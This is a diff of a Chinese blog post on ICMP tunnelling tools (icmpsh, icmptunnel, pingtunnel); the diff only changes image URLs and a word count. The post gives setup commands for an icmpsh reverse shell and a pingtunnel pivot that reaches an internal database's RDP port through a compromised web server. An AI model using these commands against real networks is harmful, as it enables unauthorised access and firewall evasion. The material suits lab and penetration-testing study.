@@ -190,7 +190,7 @@
     <div class="head-info">
       <span class="post-info-item"><i class="iconfont iconcalendar"></i>June 29, 2020</span>
       
-      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1297</span>
+      <span class="post-info-item"><i class="iconfont iconfont-size"></i>1300</span>
     </div>
   </div>
 </section>
@@ -198,14 +198,14 @@
       <section class="content">
         <p>icmpsh</p>
 <p>安装依赖：apt-get install python-impacket<br>关闭本地icmp应答：sysctl -w net.ipv4.icmp_echo_ignore_all=1<br>被控端：icmpsh.exe -t 控制端ip<br>控制端：python icmpsh_m.py 控制端ip 被控端ip</p>
-<img src="../img/icmp/icmpsh.png" class="full-image">
+<img src="http://pl.jinny.vip/img/icmp/icmpsh.png" class="full-image">
 
 <p>icmptunnel</p>
-<p>控制端：<br>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br>./icmptunnel -s<br>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0<br>ssh <a href="mailto:&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#46;&#50;">&#114;&#x6f;&#111;&#x74;&#x40;&#49;&#x30;&#46;&#48;&#46;&#48;&#46;&#50;</a>            ——最后一步</p>
-<img src="../img/icmp/icmptunnel-server.png" class="full-image">
+<p>控制端：<br>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br>./icmptunnel -s<br>/sbin/ifconfig tun0 10.0.0.1 netmask 255.255.255.0<br>ssh <a href="mailto:&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#48;&#46;&#x30;&#x2e;&#x30;&#x2e;&#50;">&#x72;&#x6f;&#111;&#116;&#x40;&#49;&#48;&#46;&#x30;&#x2e;&#x30;&#x2e;&#50;</a>            ——最后一步</p>
+<img src="http://pl.jinny.vip/img/icmp/icmptunnel-server.png" class="full-image">
 
 <p>被控端：<br>echo 1 &gt; /proc/sys/net/ipv4/icmp_echo_ignore_all<br>./icmptunnel 控制端ip<br>/sbin/ifconfig tun0 10.0.0.2 netmask 255.255.255.0</p>
-<img src="../img/icmp/icmptunnel-client.png" class="full-image">
+<img src="http://pl.jinny.vip/img/icmp/icmptunnel-client.png" class="full-image">
 
 <p>pingtunnel</p>
 <p>#安装libpcap的依赖环境<br>yum -y install byacc<br>yum -y install flex bison</p>
@@ -214,7 +214,7 @@
 <p>场景：一个内网中，有一台Web服务器，一台数据库服务器，Web服务器可以ping通过数据库服务器，但是不能直接访问数据库服务器，已知数据库服务器此时有开启3389端口。<br>攻击者的IP地址：192.168.204.43(win10)<br>攻击者的VPS地址：192.168.206.69(kali)<br>web服务器的IP地址：192.168.206.69（外网）<br>数据库服务器的IP地址：192.168.206.67（内网）(win server 2003)</p>
 <p>在攻击者的vps（192.168.206.69）中执行如下命令<br>ptunnel -p 192.168.206.69 -lp 1080 -da 192.168.206.67 -dp 3389 -x cookie</p>
 <p>在Web服务器中执行命令<br>ptunnel -x cookie</p>
-<img src="../img/icmp/pingtunnel.png" class="full-image">
+<img src="http://pl.jinny.vip/img/icmp/pingtunnel.png" class="full-image">
 
 <p>在攻击者的机器上访问自己的vps的1080端口，即使用远程桌面连接：192.168.206.69:1080<br>虽然连接的是192.168.206.69，但是我们通过使用web服务器作为跳板，将vps的1080端口与数据库服务器的3389端口连接在一起了</p>
 
